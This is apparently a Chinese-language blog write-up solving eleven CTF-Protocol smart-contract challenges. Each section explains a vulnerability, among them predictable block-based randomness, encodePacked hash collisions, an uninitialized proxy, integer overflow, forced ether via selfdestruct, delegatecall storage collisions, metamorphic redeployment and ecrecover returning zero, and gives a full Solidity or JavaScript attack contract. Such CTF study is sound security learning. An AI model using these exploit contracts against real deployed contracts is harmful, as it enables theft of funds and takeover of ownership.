# 前言

这次是尝试<a href="https://www.ctfprotocol.com/">CTF-PROTOCOL</a>的题目，望与诸君共勉。

# 1. The Lost Kitty

题目分析：

`HiddenKittyCat`合约中，核心部分为：

```solidity
    constructor() {
        _owner = msg.sender;
        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));

        assembly {
            sstore(slot, "KittyCat!")
        }
    }
```

可以知道kitty存储的位置是由`keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));`决定的。而我们则是与`House`合约交互，每次调用一个`isKittyCatHere`，生成`Kitty`并查找。

这个因为完全取决于`block.timestamp,block.number`，类似于`Ethernaut`里的`flipflopcoin`。

部署后，`House`合约为`0xD50b65d0c843E70ab06666fEA69EC87Aa34581fB`

攻击合约：

```solidity
pragma solidity  ^0.8.0;

interface IHouse{
    function isKittyCatHere(bytes32 _slot) external;
}

contract KittyHacker {

    constructor() {

    }

    function hack(address house) public {
        bytes32 slot = 
            keccak256(
                abi.encodePacked(
                    block.timestamp, 
                    blockhash(block.number - 69)
                    )
            );
        IHouse(house).isKittyCatHere(slot);
    }

}
```

部署后攻击合约为`0x3791eeD6c8fedAf433C8ce53B8Fa69C11e0b237D`发起进攻，Hash为`0x6ced57a2de0f1dfe348f61b77e766d330a8c123cac2296cd61146796170940e9`，攻击后已经修改成功。

<hr />

# 2. RootMe

注意要点在于

`accountByIdentifier[identifier] = msg.sender`

而`identifier = keccak256(abi.encodePacked(user, salt));`

因为`abi.encodePacked`解释如下：

`types shorter than 32 bytes are concatenated directly, without padding or sign extension`

因此，虽然在部署时`ROOT`、`ROOT`的输入，但`ROOTR`、`OOT`也能encode出同样的效果。

攻击合约如下：

```solidity
pragma solidity  ^0.8.0;

interface IRootMe{
    function register(string memory username, string memory salt) external;
    function write(bytes32 storageSlot, bytes32 data) external;

}

contract RootMeHacker {

    constructor(){

    }

    function testEncodePackedValue(string memory user, string memory salt) public pure returns (bytes memory) {
        bytes memory packed = abi.encodePacked(user, salt);
        return packed;
    }

    function attack(address target,bytes32  slot, bytes32  content) public{
        IRootMe(target).register("RO","OTROOT");
        IRootMe(target).write(slot,content);
    }
}
```

部署合约地址为`0xb92F069Aec3Ae791fA717FFC0D9FAE73039bB1a5`。这里先用`testEncodePackedValue`测试，(`ROOT`、`ROOT`)的输入其实只是将值拼接`0x524f4f54524f4f54`，`R`的Ascii值为82，对应`Hex`就是`0x52`。

同时，我们先通过`register`获取权限，再通过`write`写入slot`0000000000000000000000000000000000000000000000000000000000000000`中的值为`0000000000000000000000000000000000000000000000000000000000000001`。（记得传参时，前面需要加上0x）。攻击后已经修改完成。

<hr />

# 3. Trickster

进行了测试，如果直接与`JackpotProxy`交互，则会有来无回，为什么？

因为在`JackpotProxy::constructor`中，创建了`_proxy`，但却没有进行初始化`initialize`。所以在调用`claimPrize`时，`owner`与`msg.sender`不匹配，因此无法成行。

我们在`Goerli`上查看调用<a href="https://goerli.etherscan.io/tx/0xba80c4d9716e62fc3ab806f9b8fad6843744beffb8d99927ec8d11e212081d48">Tx</a>，可以获得`JackPot=0x8Aa401B931C990DCA9D4d5EAbe67217e320D731C`，直接调用`JackPot::initialize`获得所有权。

在获取后，传入`100000000000000`wei，调用`JackPot::claimPrize`。此时，已经掏空`JackPot`余额。

<hr />

# 4. The Golden Ticket

初步判断，看看是不是有溢出漏洞`            waitlist[msg.sender] += uint40(_time); `（unchecked）。这里遇到一个问题，remix里`VM`模式无论如何都无法调用`joinRaffle`，一直报错`Not Found`。但在web3 injector模式中却没问题，不知道其中原因。估计是一个Bug？

```Solidity
pragma solidity  ^0.8.0;

interface IGoldenTicket{
    function joinWaitlist() external;
    function updateWaitTime(uint256) external;
    function joinRaffle(uint256) external;
    function giftTicket(address) external;
    function waitlist(address) external returns (uint40);
}

contract TheGoldenTicketHacker {
 
    constructor(){

    }

    function check(address _addr) public  returns (bool){
        return (IGoldenTicket(_addr).waitlist(address(this)) < block.timestamp );
    }

    function checkTimestamp() public view returns (uint256){
        return block.timestamp;
    }

    function attack(address _addr,address _to) public{
        IGoldenTicket(_addr).joinWaitlist();
        IGoldenTicket(_addr).updateWaitTime(type(uint40).max- IGoldenTicket(_addr).waitlist(address(this)) + 1 days);
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        IGoldenTicket(_addr).joinRaffle(randomNumber);
        IGoldenTicket(_addr).giftTicket(_to);
    }
}
```

<hr />

# 5. Smart Horrocrux

原来`Horrocrux`是`魂器`的意思，学习到了。

切入点肯定在`destroyIt`里，我们对该函数的`callData`进行分析，假设输入`spell=111,magic=3`有`calldata`如下：

```
0x60c4a9f1 // selector
0000000000000000000000000000000000000000000000000000000000000040 // 0x0 string index
0000000000000000000000000000000000000000000000000000000000000003 // 0x20 magic
0000000000000000000000000000000000000000000000000000000000000003 // 0x40 string length
3131310000000000000000000000000000000000000000000000000000000000 // string value
```

```solidity
spellInBytes := mload(add(spell, 32))
```

以上读取的肯定是`string value` = `0x45746865724b6164616272610000000000000000000000000000000000000000` (ascii -> bytes) 所以value应该是`EtherKadabra`

而又需要`        (bytes4(bytes32(uint256(spellInBytes) - magic))) `恰好是`kill`(selector为0x41c0e1b5)（实际计算时应该是后面还需要补56个0）所以`magic=1674133761342824277929123818302714816965480662716616051558525647956333297664`

同时别忘了还需要将`invincible`设置为false。这需要合约只有1wei，只能通过自毁合约进行，所以我们也得写个合约。最后攻击合约如下：

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface ISmartHorrocrux {
    function destroyIt(string memory,uint256) external;
    function setInvincible() external;
}

contract Bomb {

    constructor() {

    }

    fallback() external payable {

    }

    function destroy(address victim) public{
        selfdestruct(payable(victim));
    }


}

contract SmartHorrocruxHacker {

    ISmartHorrocrux victim;

    constructor(address target) payable{
        victim = ISmartHorrocrux(target);
    }


    function attack(string memory spell, uint256 magic) public{
        Bomb bomb = new Bomb();
        payable(address(bomb)).transfer(1);
        payable(address(victim)).call("");
        bomb.destroy(address(victim));
        victim.setInvincible();
        victim.destroyIt(spell,magic);
    }
}
```

此时gas要给高一点，不然会出现outOfGas。

PS： Remix体验简直是糟糕！浪费我很多时间！

<hr />

# 6. Gas Valve

这一题要注意：`model no. EIP-150`，有解释如下：`使用ADD这样的简单操作相对于复杂计算操作，例如用SHA256加密一个特定的数字，会消耗较少的gas。攻击者通过在他的交易合同中不断的使用某些特定的opcodes使得整个交易变得计算复杂却在网络上消耗极少的费用。`

问题在这里

```solidity
        try nozzle.insert() returns (bool result) {
            lastResult = result;
            return result;
        } catch {
            lastResult = false;
            return false;
        }
```

当抛出异常才会认为失败，否则即使`result=false`也会直接返回。

其实思路很简单，如何消耗完所有的`gas`呢？尝试循环调用直到达到最大深度，结果失败（抛出了异常）。查看<a href="https://ethereum.stackexchange.com/questions/594/how-do-gas-refunds-work">Gas Refund</a>可以看到，`selfdestruct`会立马触发`gasRefund`，而不会抛出异常。

攻击合约如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract ValveHacker {

    constructor() {

    }

    function insert() public returns (bool result) {
        selfdestruct(payable(msg.sender));
    }

}
```

<hr />

# 7. Stonk

问题在于：

`        require(amountGMEin / ORACLE_TSLA_GME == amountTSLAout, "Invalid price"); `

因为solidity中没有小数，所以会导致会有整除为0的情况，即`1/2=0`，也就是将`GME`换成`TSLA`时，可以小额兑换，实际什么也拿不到。

一开始，想用合约去攻击，后来发现写死有`msg.sender`，所以只能用js去写了。

```javascript
const abi = [
    "function buyTSLA(uint256 amountGMEin, uint256 amountTSLAout)",
    "function sellTSLA(uint256 amountTSLAin, uint256 amountGMEout)"
];

const addressStonk = '0x1552F5d5e9d31E51a412a8E5DA2b8F27040Dfb3a';
const contract= new ethers.Contract(addressStonk, abi, provider);

console.log(contract);

async function attack(){
    const tx1 = await contract.connect(hacker).sellTSLA(20,1000);
    await tx1.wait();
    console.log(tx1);

    for (i = 0 ;i < 50; i++){
        await contract.connect(hacker).buyTSLA(40,0);
    }
}

attack();
```

PS : Gas 杀手！

<hr />

# 8. Pelusa

有一点限制`        require(msg.sender.code.length == 0, "Only EOA players"); `且还要实现`IGame`和`handOfGod()`函数。这就表明要在创建过程`code.length=0`时调用`passTheBall`。且还要通过`delegateCall`修改第二个槽上的变量。

这里好像遇到一个大坑！在`remix`中，不同区块下blockhash结果似乎不一样？仔细研究了一下：

```
所述block.number状态变量允许获得所述当前块的高度。当矿工获得执行合约代码的交易时，block.number该交易的未来区块的 的 是已知的，因此合约可以可靠地访问其价值。但是，在 EVM 中执行交易的那一刻，由于显而易见的原因，正在创建的区块的区块哈希尚不可知，并且 EVM 将始终产生零。
```

所以：

```solidity
        value = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
        value2 = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, bytes32(0))))));
```

以上两者的结果就是相等的！

所以攻击合约如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract PelusaHacker {

    Exploit public exp;

    constructor() {

    }

    function attack(address target, address sender) public{

        while (true) {
            exp = new Exploit(target);
            if (uint256(uint160(address(exp))) % 100 == 10){
                break;
            }
        }
        exp.setParam(sender);
        exp.attack();

    }

}


contract Exploit {

    address public  fakeOwner;
    uint256 private shot = 0;
    address private target;

    constructor(address _target){
        target = _target;
        if (uint256(uint160(address(this))) % 100 == 10){
            IPelusa(target).passTheBall();
        }
    }

    function setParam(address sender) public {
        fakeOwner =  address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, bytes32(0))))));
    }

    function getBallPossesion() public view returns (address){
        return fakeOwner;
    }

    function handOfGod() public returns (uint256){
        shot = shot + 1;
        return 22061986;
    }

    function attack() public {
        IPelusa(target).shoot();
    }
}

interface IPelusa{
    function passTheBall() external;
    function shoot() external;
}
```

攻击时，我们应该找到sender：`"0xaa758e00eca745cab9232b207874999f55481951"`

记得把`gas`拉高一点。结果在测试网上似乎还有问题，再跑一遍又好了！



<hr />

# 9. Hack the Mothership!

问题出现在：

`        (bool success,) = module.delegatecall(msg.data); `

而`module`与`spaceship`又出现了`slot collision`。

我们想要`        hacked = true; `，就需要满足`leader == msg.sender`，所以需要

`promoteToLeader(address _leader)`，这里就需要满足：

```
The proposed leader is a spaceship captain
	=> assignNewCaptainToShip(address _newCaptain) mothership
		=> askForNewCaptain(address _newCaptain) spaceship
        	=> _isCrewMember(address)
    => isLeaderApproved(address) => OK
```

所以我们的思路：

1. 对于`spaceship`，将其`captain`置0，将自己加入`fleet`，`askForNewCaptain`
2. `addModule`修改`LeaderShip`指向合约，直接通过
3. `promoteToLeader`

因为都要通过，所以`spaceship`的`captain`都要修改。

攻击合约如下：

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract ShipHacker {

    IMotherShip public ship;
    FakeCaptain public captain;
    ISpaceShip public spaceship;

    constructor(address target) {
        ship = IMotherShip(target);
    }

    function fleet(uint256 x)  public{
        ship.fleet(x);
    }

    function attack() public{
        for (uint i = 0; i < 5; i++){
            spaceship = ISpaceShip(ship.fleet(i));
            captain = new FakeCaptain();
            spaceship.replaceCleaningCompany(address(0));
            spaceship.addAlternativeRefuelStationsCodes(uint256(uint160((address(captain)))));
            captain.attack(address(spaceship));
        }
        ship.promoteToLeader(address(captain));
        captain.hack(address(ship));
    }


}

contract FakeCaptain {

    constructor() {

    }

    function hack(address _ship) external {
        IMotherShip(_ship).hack();
    }

    function attack(address _spaceship) public {
        ISpaceShip(_spaceship).askForNewCaptain(address(this));
        ISpaceShip(_spaceship).addModule(ISpaceShip.isLeaderApproved.selector,address(this));
    }


    function isLeaderApproved(address) external pure {

    }
}

interface IMotherShip{
    function hack() external;
    function promoteToLeader(address _leader) external;
    function fleet(uint256) external returns (address);
}

interface ISpaceShip{
    function askForNewCaptain(address _newCaptain) external;
    function addModule(bytes4 _moduleSig, address _moduleAddress) external;
    function replaceCleaningCompany(address _cleaningCompany) external;
    function addAlternativeRefuelStationsCodes(uint256 refuelStationCode) external;
    function isLeaderApproved(address) external pure;
}
```



<hr />

# 10.  Phoenixtto

```solidity
        assembly {
            x := create2(0, add(_code, 0x20), mload(_code), 0)
        }
        addr = x;
```

仔细观察，这个就是Metamorphic合约。

```
5860208158601c335a63aaf10f428752fa158151803b80938091923cf3，这串bytecode的原理是staticcall调用getImplementation方法，获取implementation合约地址，再用extcodecopy把implementation合约的runtime bytecode复制到memory，做为当前部署合约的runtime bytecode，以此来动态替换合约的runtime bytecode，而合约地址又不变。
```

所以，我们先自毁合约（手动），然后修改逻辑合约（通过攻击合约完成）即可！

```
通过`capture`手动销毁
```

攻击合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract PhoenixttoHacker {

    constructor(){

    }

    function attack(address _target) public{
        ILab(_target).reBorn(type(Phoenixtto2).creationCode);
    }

    fallback() external payable {

    }
}

contract Phoenixtto2 {
    address public owner;
    bool private _isBorn;

    function reBorn() external {
        if (_isBorn) return;

        _isBorn = true;
        owner = PLAYER_ADDRESS;
    }

    function capture(string memory _newOwner) external {
        if (!_isBorn || msg.sender != tx.origin) return;

        address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));
        if (newOwner == msg.sender) {
            owner = newOwner;
        } else {
            selfdestruct(payable(msg.sender));
            _isBorn = false;
        }
    }
}

interface ILab{
    function reBorn(bytes memory _code) external;
}
```





<hr />

# 11. Metaverse Supermarket

```
buyUsingOracle(OraclePrice calldata oraclePrice, Signature calldata signature)
```

此处oraclePrice 和 signature是分离的，只知道有签名，谁知道是不是对此签名呢？问题在于

```
ecrecover could return address(0) in case of an error!
```

而我们有没有对`Oracle`做初始化！所以`recovered == oracle`天然是成立的，我们可以随意填写。

攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;


struct OraclePrice {
    uint256 blockNumber;
    uint256 price;
}

struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}


contract InflatStoreHacker {

    constructor() {

    }

    function attack(address store) public{
        OraclePrice memory price = OraclePrice(block.number,0);
        Signature memory sig = Signature(27, 0, 0);
        IInflaStore s = IInflaStore(store);
        IMeal meal = IMeal(s.meal());
        for (uint i = 0; i< 10; i++){
            s.buyUsingOracle(price,sig);
            meal.transferFrom(address(this),0x4fd74AF56b8843b07A30DE799174AEc8ad8DF577,i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        return InflatStoreHacker.onERC721Received.selector;
    }

}

interface IInflaStore{
    function meal() external returns (address);
    function buyUsingOracle(OraclePrice calldata oraclePrice, Signature calldata signature) external;
}

interface IMeal {
    function transferFrom(address,address,uint256) external;
}
```



<hr />

挑战完成！
